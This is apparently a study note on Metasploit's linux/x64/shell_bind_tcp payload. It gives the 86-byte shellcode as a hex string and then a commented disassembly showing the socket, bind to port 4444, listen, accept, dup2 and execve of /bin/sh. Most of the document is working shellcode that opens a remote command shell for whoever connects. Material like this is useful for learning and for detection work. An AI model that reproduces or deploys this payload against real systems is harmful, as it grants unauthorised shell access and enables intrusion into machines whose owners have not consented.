; linux/x64/shell_bind_tcp: Listen for a connection and spawn a command shell

; msf payload(shell_bind_tcp) > generate
; # linux/x64/shell_bind_tcp - 86 bytes
; # http://www.metasploit.com
; # VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false, 
; # PrependSetresuid=false, PrependSetreuid=false, 
; # PrependSetuid=false, PrependSetresgid=false, 
; # PrependSetregid=false, PrependSetgid=false, 
; # PrependChrootBreak=false, AppendExit=false, 
; # InitialAutoRunScript=, AutoRunScript=
; buf = 
; "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97" +
; "\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a" +
; "\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a" +
; "\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21" +
; "\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69" +
; "\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6" +
; "\x0f\x05"

; assembly code

push   0x29
pop    rax			
cdq    
push   0x2
pop    rdi				; AF_INET = 2
push   0x1
pop    rsi				; SOCK_STREAM = 1
syscall 				; syscall 41 __NR_socket
					; the socket is created and stored in rax
xchg   rdi,rax				; rdi has the socket
push   rdx
mov    DWORD PTR [rsp],0x5c110002	; port 4444 (0x115C) and AF_INET
mov    rsi,rsp				; sockaddr structure
push   0x10				; sockaddr_len
pop    rdx
push   0x31		
pop    rax
syscall 				; syscall 49 __NR_bind
									; bind created
push   0x32
pop    rax
syscall 				; syscall 50 __NR_listen
					; the socket is listening for incoming connections
xor    rsi,rsi				
push   0x2b
pop    rax
syscall 				; syscall 43 __NR_accept
					; the socket accepts the connection
xchg   rdi,rax				; rdi takes the connection
push   0x3				
pop    rsi				; rsi prepared to store stdin, stdout and stderr in a loop. 
dec    rsi
push   0x21
pop    rax				
syscall 				; syscall __NR_dup2
jne    0x601073				; generates the 3 dup2 calls in a loop to shrink the code
									
push   0x3b
pop    rax
cdq    
movabs rbx,0x68732f6e69622f		; rbx = /bin/sh
push   rbx
mov    rdi,rsp				
push   rdx
push   rdi
mov    rsi,rsp
syscall					; syscall __NR_execve 
